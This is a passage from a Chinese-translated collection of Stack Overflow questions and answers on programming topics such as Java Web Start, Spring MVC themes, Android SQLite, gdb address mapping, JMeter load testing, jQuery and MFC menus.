        <jar href="base/application.jar" main="true"/>
        <jar href="base/sessions.jar"/>
        <jar href="base/swingSessions.jar"/>
        <jar href="base/sharedClientServer.jar"/>
        <jar href="base/baseLookAndFeelNoDecorations.jar"/>
        <jar href="base/clientCommon2.jar"/>
        <jar href="base/httpProvider.jar"/>
        <jar href="base/swing.jar"/>
        <jar href="base/swingImages.jar"/>
        <jar href="base/glf.jar"/>
        <jar href="base/vnc.jar"/>
        <jar href="thirdPartyLib/TableLayout-bin-jdk1.5-2007-04-21.jar"/>
        <jar href="thirdPartyLib/dbswing.jar"/>
        <jar href="thirdPartyLib/dx.jar"/>
        <jar href="thirdPartyLib/beandt.jar"/>
        <jar href="thirdPartyLib/jnlp.jar"/>
        <jar href="thirdPartyLib/alloy.jar"/>
        <jar href="thirdPartyLib/commons-beanutils.jar"/>
        <jar href="thirdPartyLib/commons-collections-3.1.jar"/>
        <jar href="thirdPartyLib/commons-logging.jar"/>
        <jar href="thirdPartyLib/commons-codec-1.3.jar"/>
        <jar href="thirdPartyLib/commons-lang-2.0.jar" download="lazy"/>
        <jar href="thirdPartyLib/httpclient-4.0-beta2.jar"/>
        <jar href="thirdPartyLib/httpcore-4.0.jar"/>
        <jar href="thirdPartyLib/log4j-1.2.15.jar" download="lazy"/>
        <jar href="thirdPartyLib/jbcl.jar" download="lazy"/>
        <jar href="thirdPartyLib/mail-1.4.jar" download="lazy"/>
        <jar href="thirdPartyLib/activation-1.1.jar" download="lazy"/>
        <jar href="base/javolution.jar" download="lazy"/>
    </resources>
    <application-desc>
    </application-desc>
</jnlp> 
```

当我尝试使用 Java1.7.0_06 和更高版本运行它时，我得到一个异常：

```
java.lang.NullPointerException
    at java.util.zip.ZipFile.<init>(Unknown Source)
    at java.util.jar.JarFile.<init>(Unknown Source)
    at java.util.jar.JarFile.<init>(Unknown Source)
    at com.sun.javaws.LaunchDownload.getMainClassName(Unknown Source)
    at com.sun.javaws.Launcher.doLaunchApp(Unknown Source)
    at com.sun.javaws.Launcher.run(Unknown Source)
    at java.lang.Thread.run(Unknown Source) 
```

控制台日志是：

```
Java Web Start 10.7.2.11
Using JRE version 1.7.0_07-b11 Java HotSpot(TM) 64-Bit Server VM
User home directory = C:\Users\val
----------------------------------------------------
c:   clear console window
f:   finalize objects on finalization queue
g:   garbage collect
h:   display this help message
m:   print memory usage
o:   trigger logging
p:   reload proxy configuration
q:   hide console
r:   reload policy configuration
s:   dump system and deployment properties
t:   dump thread list
v:   dump thread stack
0-5: set trace level to <n>
----------------------------------------------------
Match: beginTraversal
Match: digest selected JREDesc: JREDesc[version 1.6+, heap=-1--1, args=null, href=http://java.sun.com/products/autodl/j2se, sel=false, null, null], JREInfo: JREInfo for index 0:
    platform is: 1.7
    product is: 1.7.0_07
    location is: http://java.sun.com/products/autodl/j2se
    path is: C:\Program Files\Java\jre7\bin\javaw.exe
    args is: null
    native platform is: Windows, amd64 [ x86_64, 64bit ]
    JavaFX runtime is: JavaFX 2.2.1 found at C:\Program Files\Java\jre7\
    enabled is: true
    registered is: true
    system is: true

    Match: ignoring maxHeap: -1
    Match: ignoring InitHeap: -1
    Match: digesting vmargs: null
    Match: digested vmargs: [JVMParameters: isSecure: true, args: ]
    Match: JVM args after accumulation: [JVMParameters: isSecure: true, args: ]
    Match: digest LaunchDesc: null
    Match: digest properties: []
    Match: JVM args: [JVMParameters: isSecure: true, args: ]
    Match: endTraversal ..
    Match: JVM args final: 
    Match: Running JREInfo Version    match: 1.7.0.07 == 1.7.0.07
     Match: Running JVM args match: have:<>  satisfy want:<>
#### Java Web Start Error:
#### null 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-29T15:20:27.263

你的 application-desc 元素是空的感觉很奇怪。

根据[jnlp-secification](http://docs.oracle.com/javase/7/docs/technotes/guides/javaws/developersguide/syntax.html)它必须包含属性属性**main-class**。

```
<application-desc main-class="com.yourcompany.MyCoolApplication" /> 
```

# wcf - MonoTouch 中的 WCF NetHttpBinding

> ID：12392634
> 
> 赞同：2
> 
> 时间：2012-09-12T16:29:04.830
> 
> 标签：wcf, xamarin

MonoTouch 是否/将支持WCF 4.5的新**NetHttpBinding ？**

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:19:32.593

NetHttpBinding 是为使用 HTTP 或 WebSocket 服务而设计的绑定。但它只在 Windows 8 上使用 WebSocket，否则使用 Http。

请参阅：http: [//msdn.microsoft.com/en-us/library/system.servicemodel.nethttpbinding.aspx](http://msdn.microsoft.com/en-us/library/system.servicemodel.nethttpbinding.aspx)

Mono touch 支持与 silverlight 3 相同的客户端绑定，这意味着 basichttpbinding。（至少根据我能找到的最新信息）

在您的情况下，由于您使用的是 xamarin，因此我假设您没有在 Windows 8 上运行，因此您可能会遇到 basichttpbinding。

# spring - Spring MVC ThemeChangeInterceptor 不改变主题

> ID：12392635
> 
> 赞同：0
> 
> 时间：2012-09-12T16:29:12.130
> 
> 标签：spring, model-view-controller, themes, interceptor

我被困在一件非常痛苦的事情上。我正在尝试使用 Spring WebMVC 的主题。

这是我的 web-context.xml 文件的结尾：

```
<beans:bean id="themeChangeInterceptor" class="org.springframework.web.servlet.theme.ThemeChangeInterceptor" >
    <beans:property name="paramName" value="theme" />
</beans:bean>
<beans:bean id="themeSource" class="org.springframework.ui.context.support.ResourceBundleThemeSource">
    <beans:property name="basenamePrefix" value="theme-" />
</beans:bean>
<beans:bean id="themeResolver" class="org.springframework.web.servlet.theme.CookieThemeResolver" >
    <beans:property name="defaultThemeName" value="default" />
</beans:bean>
<beans:bean id="handlerMapping" class="org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping">
    <beans:property name="interceptors">
        <beans:list>
            <beans:ref bean="themeChangeInterceptor" />
        </beans:list>
    </beans:property>
</beans:bean> 
```

在我的头文件中，我有类似的内容：

```
<span style="float: right">
        <a href="?theme=default">Default</a>
        |
        <a href="?theme=other">Other</a>
</span> 
```

最后，我的 html 头有（在所有视图中导入）：

```
<link rel="stylesheet" href="<spring:theme code="css"/>" type="text/css" /> 
```

我在 src/main/resources 中获得了两个属性文件，这导致了我的 css。例如在 theme-default.properties 中，有：

```
css=static/css/dev.css 
```

我的 CSS 在 src/webapp/static/css/ 中。当我第一次加载网站时，主题是默认的，所以我认为主题解析器正确找到了属性文件和 css。但是当我点击标题中的默认或其他时，什么也没有发生。

你知道问题出在哪里吗？

非常感谢您！奥利维尔。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T19:38:32.237

我认为您错误地注册了拦截器。如果您通过 using 配置 Spring-MVC，`<mvc:annotation-driven/>`则单独的`handlerMapping`将不起作用，因为默认 handlerMapping 也由自定义`mvc`命名空间注册。尝试以这种方式注册它：

```
<mvc:interceptors>
    <ref bean="themeChangeInterceptor"/>
</mvc:interceptors> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-03T02:10:11.413

你应该有`<mvc:interceptors>`声明。你的 ThemeChangeInterceptor bean 应该在那里

```
<mvc:interceptors>
        <beans:bean class="org.springframework.web.servlet.i18n.LocaleChangeInterceptor">
            <beans:property name="paramName" value="lang" />
        </beans:bean>
        <beans:bean class="org.springframework.web.servlet.theme.ThemeChangeInterceptor">
            <beans:property name="paramName" value="theme" />
        </beans:bean>
</mvc:interceptors> 
```

# ocr - 安装 Tessnet

> ID：12392637
> 
> 赞同：0
> 
> 时间：2012-09-12T16:29:15.290
> 
> 标签：ocr, .net-4.5, tessnet2

我最近几天都在尝试在我的项目中安装 tessnet2 包装器，但它不起作用。有时说不能将 .net 2 dll 文件与 .net 4.5 项目混合，有时会抛出奇怪的异常（见图）。你能帮我解决这个问题吗？

![在此处输入图像描述](../Images/b25aac39c1a0b32eb94669b3ae35c15c.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-11T23:56:59.130

兼容性问题可以通过设置项目的目标框架来解决：进入Project-Properties，将目标框架设置为“.net Framework 2.0”。

# reporting-services - Tablix Row Total 能否仅引用最后 X 组？

> ID：12392638
> 
> 赞同：0
> 
> 时间：2012-09-12T16:29:24.073
> 
> 标签：reporting-services, ssrs-2008, ssrs-tablix

我有一个包含 1 到 x 列组的 tablix 报告。在每一行的总数中，是否可以只引用最后 2 组？要求是添加一列，显示最后 2 组之间的最新百分比变化。

```
Jan   Feb   Mar   |Total  Recent % Change
5     10    5      20     50%
1     3     6      10     200% 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-13T17:29:48.743

我最终使用了我在这篇文章中学到的技术： [在 SSRS 中创建条件总行](https://stackoverflow.com/questions/4472571/creating-conditional-total-rows-in-ssrs)

基本上，我添加了另一个字段，其中组的排名/顺序按降序排列（因此最近的组是#1）。

表达式示例：（*请注意，我有自定义代码来执行除法，这样我就不会得到除以零的错误。）*

```
=code.divide(sum(iif(fields!Last_ORDER.Value=1,fields!Num_Apps_Submitted.Value,0)),sum(iif(fields!Last_ORDER.Value=2,fields!Num_Apps_Submitted.Value,0))) 
```

# gdb - 如何将 gdb 中的 $eip 映射到 objdump -d 的输出？

> ID：12392639
> 
> 赞同：1
> 
> 时间：2012-09-12T16:29:30.550
> 
> 标签：gdb, objdump

我有一个不完整的堆栈跟踪，它在一个已知的库（linux i686 架构）处停止。为了确定最后调用的函数，我试图将 $eip 作为 gdb 的输出映射到由“objdump -d library.so”生成的文件中的地址。我想我也许可以使用 gdb 中“信息共享”的 From 地址输出，以及 $eip 来计算偏移量，然后我可以将其转换为来自 objdump -d 输出的反汇编文本部分的偏移量？不确定这种方法是否明智，但在一个带有共享库的简单测试工具应用程序中尝试它并没有在正确的函数中给我一个地址。非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T04:51:23.190

> 我想我也许可以使用 gdb 中“信息共享”的 From 地址输出，以及 $eip 来计算偏移量，然后我可以将其转换为来自 objdump -d 输出的反汇编文本部分的偏移量？

是的，这正是您需要做的。

GDB 显示中的`From`地址告诉您`.text`共享库的部分所在的位置。

会告诉你自己的`readelf -S foo.so | grep '\.text'`偏移`.text`量`foo.so`。从另一个中减去一个，您将获得该共享库的*重定位*（它将是页面对齐的）。

现在`$eip`从 GDB 中取出，减去重定位，您将得到一个与`nm`和`objdump`for 的输出相匹配的地址`foo.so`。

*但是*，GDB 内部已经完成了上述所有步骤。如果它无法推断出`$eip`最终是哪个函数，那么您不应该期望手动执行这些步骤会产生更好的结果。

# android - ContentProvider 的数据库

> ID：12392643
> 
> 赞同：0
> 
> 时间：2012-09-12T16:29:48.633
> 
> 标签：android, sqlite, broadcastreceiver

我在 sqlitebrowser 中创建了一个 sqlite 数据库并将其复制到资产中并将其复制到`/data/data/ir.smspeik.sms/databases/MyDB1`主要活动中：

```
try {
    String destPath = "/data/data/" + getPackageName()
            + "/databases/MyDB1";
    File f = new File(destPath);

    if (!f.exists()) {
        CopyDB(getBaseContext().getAssets().open("smsdb"),
                new FileOutputStream(destPath));
        Toast.makeText(getApplicationContext(), "ehsan", Toast.LENGTH_LONG).show();
    }
} catch (FileNotFoundException e) {
    e.printStackTrace();
} catch (IOException e) {
    e.printStackTrace();
} 
```

我创建了一个数据库助手：

```
public class DBAdapter {
    public static final String KEY_ROWID = "id";
    public static final String KEY_TITLE = "SmsTitle";
    public static final String KEY_BODY = "SmsBody";
    public static final String KEY_TYPE = "SmsType";
    public static final String KEY_NO = "SmsNo";
    public static final String KEY_START = "SmsStart";
    public static final String KEY_END = "SmsEnd";

    private static final String TAG = "DBAdapter";

    private static final String DATABASE_NAME = "MyDB1";
    private static final String DATABASE_TABLE = "sms";
    private static final int DATABASE_VERSION = 2;

    private final Context context;    

    private DatabaseHelper DBHelper;
    private SQLiteDatabase db;

    public DBAdapter(Context ctx) 
    {
        this.context = ctx;
        DBHelper = new DatabaseHelper(context);
    }

    private static class DatabaseHelper extends SQLiteOpenHelper 
    {
        DatabaseHelper(Context context) 
        {
            super(context, DATABASE_NAME, null, DATABASE_VERSION);
        }

        @Override
        public void onCreate(SQLiteDatabase db) 
        {
            try {

            db =    SQLiteDatabase.openDatabase("/data/data/ir.smspeik.sms/databases/"+
            DATABASE_NAME, null, SQLiteDatabase.OPEN_READWRITE);
        //  Toast.makeText(, broadcastIntent.getStringExtra("sms"), Toast.LENGTH_SHORT).show();
            //  db.execSQL(DATABASE_CREATE);    
            //  db.openDatabase(path, factory, flags)
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) 
        {
            Log.w(TAG, "Upgrading database from version " + oldVersion + " to "
                    + newVersion + ", which will destroy all old data");
            db.execSQL("DROP TABLE IF EXISTS contacts");
            onCreate(db);
        }
    }    

    //---opens the database---
    public DBAdapter open() throws SQLException 
    {
        db = DBHelper.getWritableDatabase();
        return this;
    }

    //---closes the database---    
    public void close() 
    {
        DBHelper.close();
    }

    //---insert a contact into the database---
    public long insertContact(String name, String email) 
    {
        ContentValues initialValues = new ContentValues();
        initialValues.put(KEY_TITLE,"ehsan");
        initialValues.put(KEY_BODY,"ehsan");
        initialValues.put(KEY_TYPE,"1");
        initialValues.put(KEY_NO,"4534534");
        initialValues.put(KEY_START,"1");
        initialValues.put(KEY_END,"4");

        return db.insert(DATABASE_TABLE, null, initialValues);
    }

    //---deletes a particular contact---
    public boolean deleteContact(long rowId) 
    {
        return db.delete(DATABASE_TABLE, KEY_ROWID + "=" + rowId, null) > 0;
    }

    //---retrieves all the contacts---
    public Cursor getAllContacts() 
    {
        return db.query(DATABASE_TABLE, new String[] {KEY_ROWID, KEY_TITLE,
                KEY_BODY}, null, null, null, null, null);
    }

    //---retrieves a particular contact---
    public Cursor getContact(long rowId) throws SQLException 
    {
        Cursor mCursor =
                db.query(true, DATABASE_TABLE, new String[] {KEY_ROWID,
                KEY_TITLE, KEY_BODY}, KEY_ROWID + "=" + rowId, null,
                null, null, null, null);
        if (mCursor != null) {
            mCursor.moveToFirst();
        }
        return mCursor;
    }

    //---updates a contact---
    public boolean updateContact(long rowId, String name, String email) 
    {
        ContentValues args = new ContentValues();
        args.put(KEY_TITLE, name);
        args.put(KEY_BODY, email);
        return db.update(DATABASE_TABLE, args, KEY_ROWID + "=" + rowId, null) > 0;
    }
} 
```

在 BroadcastReceiver 我调用`insertcontact()`数据库 Helper ：

```
DBAdapter db = new DBAdapter(context);
db.insertContact("ehsan", "emain"); 
```

但是当我收到短信时，这些错误会引发：

```
09-12 12:10:34.561: E/AndroidRuntime(26173): FATAL EXCEPTION: main
09-12 12:10:34.561: E/AndroidRuntime(26173): java.lang.RuntimeException: Unable to start receiver ir.smspeik.sms.ReceiveSms: java.lang.NullPointerException
09-12 12:10:34.561: E/AndroidRuntime(26173):    at android.app.ActivityThread.handleReceiver(ActivityThread.java:2236)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at android.app.ActivityThread.access$1500(ActivityThread.java:130)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1271)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at android.os.Handler.dispatchMessage(Handler.java:99)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at android.os.Looper.loop(Looper.java:137)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at android.app.ActivityThread.main(ActivityThread.java:4745)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at java.lang.reflect.Method.invokeNative(Native Method)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at java.lang.reflect.Method.invoke(Method.java:511)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at dalvik.system.NativeStart.main(Native Method)
09-12 12:10:34.561: E/AndroidRuntime(26173): Caused by: java.lang.NullPointerException
09-12 12:10:34.561: E/AndroidRuntime(26173):    at ir.smspeik.sms.DBAdapter.insertContact(DBAdapter.java:91)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at ir.smspeik.sms.ReceiveSms.onReceive(ReceiveSms.java:30)
09-12 12:10:34.561: E/AndroidRuntime(26173):    at android.app.ActivityThread.handleReceiver(ActivityThread.java:2229)
09-12 12:10:34.561: E/AndroidRuntime(26173):    ... 10 more 
```

我通过 DDMS 检查了模拟器，并且在数据库文件夹中有 MyDB1。什么是错误原因？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:35:02.793

你有一个空指针 - 从你的调用堆栈

> 引起：java.lang.NullPointerException 09-12 12:10:34.561: E/AndroidRuntime(26173): at ir.smspeik.sms.DBAdapter.insertContact(DBAdapter.java:91)

我在您粘贴的代码中看不到行号，但它必须是 db 为空

# performance - 在 JMeter 中同时进行 Web 负载测试的用户？

> ID：12392644
> 
> 赞同：0
> 
> 时间：2012-09-12T16:29:54.373
> 
> 标签：performance, load, webserver, jmeter

我制作了一些 PHP 脚本，我想测试[JMeter中](http://jmeter.apache.org/)**同时用户**的响应时间。此脚本在很短的时间内（50 毫秒）运行。

我想做的是模拟 1 到 50 个用户的负载测试，其中每个用户（线程）无限期地重复请求。所以首先我们将有 1 个用户，在 2**个同时用户**之后，在 3 个之后......等等。

我正在尝试这样做，但我有响应时间，很明显没有同时请求。

使用 HP loaddrunner，我们可以定义**每个线程的迭代次数**，这在 JMeter 中可行吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T17:23:46.713

您可以使用这 2 个线程组实现

*   [步进线程组](http://code.google.com/p/jmeter-plugins/wiki/SteppingThreadGroup)
*   [终极线程组](http://code.google.com/p/jmeter-plugins/wiki/UltimateThreadGroup)

来自[Jmeter Plugins](http://code.google.com/p/jmeter-plugins/)包，可让您根据需要为场景设置负载增加。

如果您想要[“更好”的并发性](https://stackoverflow.com/questions/10482982/jmeter-configuration-performance-testing-after-login/10484153#10484153)，您也可以查看[同步计时器](http://jmeter.apache.org/usermanual/component_reference.html#Synchronizing_Timer)- 但这更像是压力测试用例而不是负载测试用例。

# c# - 检查 Datatable.Select 中的方括号

> ID：12392647
> 
> 赞同：1
> 
> 时间：2012-09-12T16:30:18.990
> 
> 标签：c#, select, datatable, square-bracket

我想知道怎么做

```
dataTable.select([Short Description] like '%[%]%'). 
```

上述行错误，语法无效。有人可以告诉我正确的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:32:38.393

代码应如下所示：

```
dataTable.select("[Short Description] like '%[%]%'") 
```

您忘记将其包含在双引号中。

# grails - NoClassDefFoundError 将项目从 2.1.0 升级到 2.1.1

> ID：12392648
> 
> 赞同：0
> 
> 时间：2012-09-12T16:30:19.630
> 
> 标签：grails

我正在尝试将项目从 grails 2.1.0 升级到 grails 2.1.1 但运行它我得到了

```
| Error Fatal error during compilation org.apache.tools.ant.BuildException: java.lang.NoClassDefFoundError: org/apache/batik/dom/svg/SVGOMDocument 
```

但是蜡染 jar 正确地位于 lib 文件夹中，使用 2.1.0 编译它可以工作，所以我认为 MAC 上的 2.1.1 中存在类路径问题。

已经尝试过：

删除目标目录 删除 ivy-cache 目录 执行 grails clean 执行 grails 编译 --refresh-dependencies

PS 我在 /lib 文件夹中有一个 xerces_2_5_0.jar。我看到在 2.1.1 中修复了一些关于 xerces 的问题，可能与我的问题有关吗？[http://jira.grails.org/browse/GRAILS-8819](http://jira.grails.org/browse/GRAILS-8819)

# google-maps - 谷歌地图 api v3 跨国际日期变更线折线上的中心点

> ID：12392654
> 
> 赞同：2
> 
> 时间：2012-09-12T16:30:46.217
> 
> 标签：google-maps, google-maps-api-3

我正在回答我自己的问题（希望对您有利），但这就是问题所在：

我用折线创建了一张世界地图（在谷歌地图 API v3 中）。其中一些线跨越 IDL（国际日期变更线）。我想在我的一些线上放置方向箭头，每条线的中心有一个箭头。在跨越 IDL 的线上，通过平均 2 个端点一起计算箭头中心：(latlng1.lat()+latlng2.lat()/2), (latlng1.lng()+latlng2.lng()/2)在世界各地以相反的方式绘制线，在我的地图上留下一个浮动箭头，而不是在实际线的中心。

我最初寻求一个公式来获取线的反向并以某种方式确定使用了哪个。但它过于依赖地图显示。我什至想看看如果我首先将它们转换为像素，是否可以从线的端点获得中心，但数据转换对结果没有影响。

所以我然后想在折线上寻找一个相交方法，通过一个点来检查 - 如果不是，从反向线找到中心点（我相信会是 180-center.lng()）但是那里不是折线上的交集方法。所以我开始研究边界对象，因为边界上有一些交集/包含方法。

因此，对于一个相对未记录的问题，这是一个非常简单的解决方案：

（检索边界的功能归功于 Ben Appleton，ty）：

```
function getBoundsForPoly(poly) {
  var bounds = new google.maps.LatLngBounds;
  poly.getPath().forEach(function(latLng) {
  bounds.extend(latLng);
  });
  return bounds;
}

var poly_bounds = MapAbstraction.get_poly_bounds(line);
var center_point =poly_bounds.getCenter(); 
```

然后我可以将我的 center_point 传递给我的标记创建工具，以在线的实际中心生成箭头，而不必担心它是以哪种方式绘制的。

# css - 菜单显示中的溢出样式

> ID：12392665
> 
> 赞同：0
> 
> 时间：2012-09-12T16:32:04.260
> 
> 标签：css, html

在我的菜单`overflow:hidden`中，如果屏幕尺寸变小，我使用菜单宽度来显示我的菜单并隐藏文本。但是它同时也隐藏了子菜单

子菜单是指 > 2 级的菜单 因此，如果我将某个项目悬停在菜单栏中，我可以获得菜单显示，但如果该菜单包含一些子项目，则它们根本不会显示。但是当我删除溢出：隐藏在我的用于`ul/li`创建菜单的元素的css中时，它们会显示出来，但文本看起来很难看，特别是如果它比菜单宽度长

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:53:19.857

我认为使用它应该可以工作：

```
ul{
    overflow:visible;
}
ul.li{
    overflow:hidden;
}
ul.li.ul{
    overflow:visible;
}
ul.li.ul.li{
    overflow:hidden;
} 
```

当然，您必须将其应用于您自己的样式表。我不确定这会起作用，因为我无法从这里看到您的代码/样式表。

# javascript - 使用固定标题将行添加到 HTML 表

> ID：12392666
> 
> 赞同：1
> 
> 时间：2012-09-12T16:32:12.637
> 
> 标签：javascript, jquery, html, html-table

我有一个带有固定标题的 HTML 表格。我在 Stack Overflow 上找到的用于固定标头的代码，我[在代码中有链接](http://gomathikrishna.net/demos/scroll.html)。

注意：我发现了另一个与 4 个月前发布的类似的帖子，但它从未得到回复——发帖者也没有发布任何有效的 JSfiddle，所以我认为有必要发布这个单独的帖子。

我遇到的问题是尝试使用 jquery 在 HTML 表中添加一行。

```
$("#MaterialTable").find("tbody").prepend(function() { 
```

代码工作得很好，直到我添加了固定的标题。现在我不知道如何解决这个问题。小提琴的链接如下。您可以看到该行已添加到表中，但它位于可滚动部分之外。

[JSFiddle：向具有固定标题的 HTML 表中添加一行](http://jsfiddle.net/A56n9/16/)

我不经常在这里发布问题，所以如果我错过了一些明显需要的信息，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:39:18.907

“滚动”代码复制了原始表......包括它的 ID。因此，您最终会得到两个具有相同 ID 的元素。

在该行之后`var newTbl = oTbl.clone();`，立即添加：`newTbl.attr("id","");`

# java - Java Swing 的最佳报告工具

> ID：12392667
> 
> 赞同：2
> 
> 时间：2012-09-12T16:32:13.293
> 
> 标签：java, jasper-reports, reporting, birt

你好，男人和女孩的

我一直在寻找适合 Eclipse IDE、易于使用且免费的报告工具。我已经对 Eclipse 中的 BIRT Reporting 有所了解，但唯一的问题是 BIRT Report 在执行时会消耗大量内存。

在浏览时，Jasper 的报告因其可用性而引起了我的注意，但突然将 jasper 报告集成到我的 Swing 应用程序中并不顺利，我被困了将近 2 周，直到我最终使用 BIRT 报告。因为没人愿意帮我...

但在这里我仍然在寻找一个好的报告工具，我可以在 Eclipse IDE 下完美地集成到我的 Swing 应用程序中

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:41:10.950

我们使用 iText 从我们的 Java 应用程序生成 PDF 输出。

[http://itextpdf.com/](http://itextpdf.com/)

[http://www.ibm.com/developerworks/opensource/library/os-javapdf/](http://www.ibm.com/developerworks/opensource/library/os-javapdf/)

# java - 获取要在 Eclipse 中构建的项目

> ID：12392668
> 
> 赞同：1
> 
> 时间：2012-09-12T16:32:14.357
> 
> 标签：java, eclipse, eclipse-plugin, eclipse-rcp

在 Eclipse 工具栏中，当您将鼠标悬停在构建按钮上时，它会出现一个工具提示，说明当前选择要构建哪些项目。有没有办法在我的 Eclipse 插件中获取这些信息？我考虑过使用 ISelectionListener 实现一些东西来继续跟踪选择了哪些项目，但是如果我可以从构建按钮获取它们的同一位置获取它们，则没有理由这样做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T09:59:58.440

好的，这个问题的答案是创建我自己的 ISelectionListener。

```
@Override
public void selectionChanged(IWorkbenchPart part, ISelection selection) {
    Object[] allselections= null;
    selectedProjects.clear();
    // TODO Auto-generated method stub

    if(selection instanceof IStructuredSelection) {
        allselections = ((IStructuredSelection)selection).toArray();
        for(Object element: allselections){

            if (element instanceof IResource) {
                selectedProjects.add(((IResource)element).getProject());
            } else if (element instanceof IAdaptable) {
                IResource resource = null;
                IAdaptable a = (IAdaptable)element;
                resource = (IResource)a.getAdapter(IResource.class);
                selectedProjects.add(resource.getProject());

            }
        }
    }
}; 
```

# jquery - 如何使用 jQuery 确定 DIV 的顶部是否在屏幕视图中？

> ID：12392669
> 
> 赞同：2
> 
> 时间：2012-09-12T16:32:13.673
> 
> 标签：jquery, scroll, position

我有一个高度为几百像素的 DIV。当用户单击按钮时，我想确保当 Ajax 从服务器返回第二个视图时他们可以查看最顶部。

如果顶部当前不在视图中，我该如何制作它只会滚动到 DIV 的顶部？

例如，如果用户在页面上根本没有滚动，具有高分辨率并且可以查看整个 DIV，我不希望发生任何滚动。对于运行较低分辨率的用户，我想确保将它们发送到 DIV 的顶部，以便他们可以看到它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T16:35:06.380

您可以使用这样的功能进行检查

**[现场演示](http://jsfiddle.net/loktar/yhQZu/18/)**

```
function checkIfInView(element){
    var offset = element.offset().top - $(window).scrollTop();

    if(offset > window.innerHeight){
        // Not in view
        $('html,body').animate({scrollTop: offset}, 1000);
        return false;
    }
   return true;
}​ 
```

您可以在要检查的 div 上的 ajax 函数之后调用它，如下所示

```
checkIfInView($('#testdiv')); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T16:35:30.920

我认为这根本不需要任何`jQuery`东西。我会`id`在顶部放置 a`div`并使用 url 中的名称重定向到`div`url，这是一个示例：

```
<div id="top_div"></div> 
```

重定向`js`：

```
// similar behavior as clicking on a link
window.location.href = "url.com/#top_div"; 
```

# ruby-on-rails - 在 Rails 之外使用 Rails 的生成器？

> ID：12392671
> 
> 赞同：1
> 
> 时间：2012-09-12T16:32:29.037
> 
> 标签：ruby-on-rails, ruby, code-generation

Rails 有自己的可定制[生成器](http://guides.rubyonrails.org/generators.html)，我如何在我自己的非 Rails 项目中使用它们？

或者是否有提供类似功能的宝石？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T16:35:13.103

我相信[Thor](https://github.com/wycats/thor)是 Rails 内部专门用于此类任务的工具

[http://rdoc.info/github/wycats/thor/master/Thor/Actions#template-instance_method](http://rdoc.info/github/wycats/thor/master/Thor/Actions#template-instance_method)

示例[https://github.com/wycats/thor/wiki/Generators](https://github.com/wycats/thor/wiki/Generators)

# sql-server - 如何仅备份和还原 SSAS 数据库中的一个多维数据集

> ID：12392673
> 
> 赞同：0
> 
> 时间：2012-09-12T16:32:31.877
> 
> 标签：sql-server, ssas, data-warehouse, ssas-2008

我在测试环境中有一个多维数据集，该多维数据集位于具有其他不相关多维数据集的 SSAS 数据库中。由于我正在测试我的 ETL 和 Fact 表，我需要截断 Fact 并多次重新运行 ETL 和多维数据集，但我需要备份以前版本的多维数据集。

我无法备份整个数据库，因为其他多维数据集很大。还有其他方法吗？我很感激帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T18:47:26.650

您可以编写多维数据集脚本，在另一台服务器上运行脚本，然后单独处理它。

# winapi - 在 Windows 中创建现代风格的动态菜单

> ID：12392677
> 
> 赞同：4
> 
> 时间：2012-09-12T16:32:45.040
> 
> 标签：winapi, visual-c++, menu

在我的基于 MFC 对话框的应用程序中，我使用 Visual Studio 资源编辑器创建了主菜单，并且在一个地方有在运行时创建的动态菜单。使用 Visual Studio 创建的菜单的所有部分都具有现代外观，而我动态创建的子菜单具有旧外观，如下图所示。

![在此处输入图像描述](../Images/b1231038ef3bec552a84bb09ff5e6b58.png)

我创建动态子菜单的代码是这样的（不是真正的代码，但真正的代码并不是那么重要）：

```
CMenu subMenu;
subMenu.CreateMenu();

for (...)
{
    subMenu.AppendMenu(
        MF_STRING | (isChecked ? MF_CHECKED : MF_UNCHECKED),
        <some menu ID>,
        <some menu text>);
} 
```

将这个子菜单插入到它所属的位置是这样完成的（几乎是实际代码）：

```
TCHAR szMenuString[256];
MENUITEMINFO mii;
mii.cbSize = sizeof(mii);
mii.fMask = MIIM_STATE | MIIM_ID | MIIM_SUBMENU | MIIM_CHECKMARKS |
    MIIM_DATA | MIIM_STRING | MIIM_BITMAP | MIIM_FTYPE;
mii.dwTypeData = szMenuString;
mii.cch = sizeof(szMenuString) / sizeof(szMenuString[0]);

GetMenu()->GetMenuItemInfo(ID_SUBMENU, &mii);
mii.fMask |= MIIM_SUBMENU;
mii.hSubMenu = subMenu.GetSafeHmenu();
GetMenu()->SetMenuItemInfo(ID_SUBMENU, &mii); 
```

